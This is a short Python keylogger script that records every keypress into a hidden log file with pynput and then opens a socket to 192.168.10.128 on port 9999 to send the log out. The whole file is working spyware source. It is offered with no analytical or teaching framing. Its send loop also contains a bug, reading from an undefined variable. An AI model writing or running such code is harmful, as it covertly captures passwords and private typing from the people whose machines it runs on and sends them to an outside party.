from pynput.keyboard import Key, Listener
import logging
import socket


logging.basicConfig(filename=(".keylog.log"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def keyEvent(event):
    logging.info(str(event))

def enterKey(event):
    if event == Key.esc:
        return False
    
with Listener(on_press=keyEvent, on_release=enterKey) as listener :
    listener.join()


s = socket.socket()
s.connect(("192.168.10.128",9999))
log_file = open (".keylog.log", "rb")
l = log_file.read(4096)
while (l):
    s.send(l)
    l = f.read(4096)
s.close()